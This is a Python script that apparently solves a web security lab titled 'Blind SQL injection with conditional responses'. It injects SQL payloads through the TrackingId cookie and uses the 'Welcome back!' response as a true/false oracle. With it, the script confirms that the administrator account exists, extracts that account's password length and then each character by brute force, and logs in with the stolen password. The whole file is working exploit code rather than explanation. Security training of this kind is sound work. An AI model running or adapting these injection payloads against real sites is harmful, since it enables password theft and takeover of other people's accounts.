#!/usr/bin/env python3
"""Blind SQL injection with conditional responses"""

import string

import lab_10


class Lab(lab_10.Lab):
    """Wrapper"""

    def set_cookie(self, key: str, value: str) -> None:
        """In-place cookie setter"""
        # self.session.cookies.set(key, None)
        self.session.cookies.set(key, value)

    def set_tracking_id(self, value: str) -> None:
        """Set the value of the tracking ID"""
        self.set_cookie("TrackingId", value)

    def _check(self, query: str) -> bool:
        self.set_tracking_id(query)
        response = self.session.get(self.url + "/")
        response.raise_for_status()
        return "Welcome back!" in response.text

    def verify_vulnerability(self) -> bool:
        """Ensure the site will leak a bit of information"""
        if not self._check("x'+OR+1=1--"):
            return False
        return not self._check("x'+OR+1=2--")

    def user_exists(self, username: str) -> bool:
        """Check if a user exists"""
        query = f"x'+UNION+SELECT+'a'+FROM+users+WHERE+username='{username}'--"
        return self._check(query)

    def _user_pw_length_greater_than(self, username: str, length: int) -> bool:
        query = f"x'+UNION+SELECT+'a'+FROM+users+WHERE+" \
                f"username='{username}'+AND+length(password)>{length}--"
        return self._check(query)

    def pw_length(self, username: str) -> int:
        """Find the lenght of a given ueser's password"""
        i = 1
        while self._user_pw_length_greater_than(username, i):
            i += 1
        return i

    def _pw_char_at_position_is(self, username: str, char: str,
                                position: int) -> bool:
        query = f"x'+UNION+SELECT+'a'+FROM+users+WHERE+" \
                f"username='{username}'+AND+" \
                f"substring(password,{position},1)='{char}'--"
        return self._check(query)

    def get_password(self, username: str) -> str:
        """Get the password of the user"""
        password = ""
        for i in range(1, self.pw_length(username) + 1):
            for char in [str(i) for i in range(10)] + list(string.ascii_letters):
                print(password + char, end="\r", flush=True)
                if self._pw_char_at_position_is(username, char, i):
                    password += char
                    break
        print()
        return password


def main() -> None:
    """Entry point"""
    site = Lab(key="", path="/")

    if not site.verify_vulnerability():
        raise RuntimeError("Couldn't trick tracking id")

    username = "administrator"
    if not site.user_exists(username):
        raise RuntimeError("Couldn't find admin user")

    password = site.get_password(username)
    user = Lab.User(username, password)

    csrf = site.csrf_token("/login")
    response = site.login(user.name, user.password, csrf=csrf)
    response.raise_for_status()
    print(response.status_code)

if __name__ == "__main__":
    main()
